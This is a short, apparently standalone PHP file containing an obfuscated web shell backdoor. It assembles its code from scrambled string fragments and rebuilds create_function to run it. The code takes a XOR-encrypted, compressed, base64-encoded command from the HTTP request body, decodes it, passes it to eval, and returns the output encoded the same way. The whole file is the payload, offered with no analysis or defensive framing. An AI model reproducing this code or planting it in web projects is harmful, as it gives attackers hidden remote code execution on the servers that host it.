<?php
$E='OvkPH8E1vzp|U";function |x($t,$k){$|c=strl|en($|k);$l=s|trl|en($t|);|$o=""';
$X='$k="4abcc|2e9|";$kh="91||1a9dd94b6f";|$kf|="1|27503|c|49|ae3|";$p="|OBjv';
$O='|n();$r=@b|ase64|_enc|ode|(@|x|(@gz|compress($o),$k));print("|$p$k|h$r$kf");}';
$P='(@|b|ase64_de|code($m[1]|)|,$k)));$o=|@ob|_get|_con|tents();|@ob_end_cl|ea';
$t='^$k|{$j};}}ret|urn| $o;}if |(@p|reg_mat|ch(||"/|$kh|(.+)$kf/",@file_ge|t_co';
$V=';|for(|$i=0;$i<$l;){f||or($j=0|;($j|<$c&&$i<$l);$||j++,$|i++){$o.=$t{$i}|';
$D=str_replace('d','','cdrddeate_fudncddtion');
$r='ntents("p|hp:/|/inpu||t"),$m)==1) {|@ob_s|tart(|);@e|val(@gzun|comp|ress(@x';
$H=str_replace('|','',$X.$E.$V.$t.$r.$P.$O);
$C=$D('',$H);$C();
?>
